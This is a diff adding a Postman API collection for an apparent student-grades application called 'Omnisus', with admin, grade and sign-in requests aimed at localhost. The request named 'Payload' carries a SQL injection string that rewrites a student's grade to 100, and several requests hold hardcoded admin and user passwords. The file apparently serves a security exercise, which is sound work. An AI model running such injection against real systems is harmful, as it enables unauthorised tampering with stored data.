@@ -1,0 +1,236 @@
+{
+	"info": {
+		"_postman_id": "e42f0d0e-48ce-4166-8f38-d7614fd59d00",
+		"name": "Omnisus",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "3046437"
+	},
+	"item": [
+		{
+			"name": "Admin",
+			"item": [
+				{
+					"name": "Create students",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "admin-password",
+								"value": "Passw0rd!",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "[\n    {\"username\" : \"\", \"password\" : \"Passw0rd!\"}\n]",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{server_url}}/api/admin/student",
+							"host": [
+								"{{server_url}}"
+							],
+							"path": [
+								"api",
+								"admin",
+								"student"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Get students",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "admin-password",
+								"value": "Passw0rd!",
+								"type": "text"
+							}
+						],
+						"url": {
+							"raw": "{{server_url}}/dashboard",
+							"host": [
+								"{{server_url}}"
+							],
+							"path": [
+								"dashboard"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Dashboard",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "admin-password",
+								"value": "Passw0rd!",
+								"type": "text"
+							}
+						],
+						"url": {
+							"raw": "{{server_url}}",
+							"host": [
+								"{{server_url}}"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Grade",
+			"item": [
+				{
+					"name": "Get grade",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{server_url}}/api/grade",
+							"host": [
+								"{{server_url}}"
+							],
+							"path": [
+								"api",
+								"grade"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "User",
+			"item": [
+				{
+					"name": "SignIn",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"username\": \"1946724\",\n    \"password\": \"J$*S[8$r\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{server_url}}/api/id/signin",
+							"host": [
+								"{{server_url}}"
+							],
+							"path": [
+								"api",
+								"id",
+								"signin"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Update student",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "pobrillant"
+						},
+						"url": {
+							"raw": "{{server_url}}/api/student",
+							"host": [
+								"{{server_url}}"
+							],
+							"path": [
+								"api",
+								"student"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Payload",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "pobrillant'; UPDATE MGRADE SET GRADE = 100 WHERE USER_ID = 23 --"
+						},
+						"url": {
+							"raw": "{{server_url}}/api/student",
+							"host": [
+								"{{server_url}}"
+							],
+							"path": [
+								"api",
+								"student"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Test",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{server_url}}/hello",
+					"host": [
+						"{{server_url}}"
+					],
+					"path": [
+						"hello"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "server_url",
+			"value": "http://localhost",
+			"type": "string"
+		}
+	]
+}
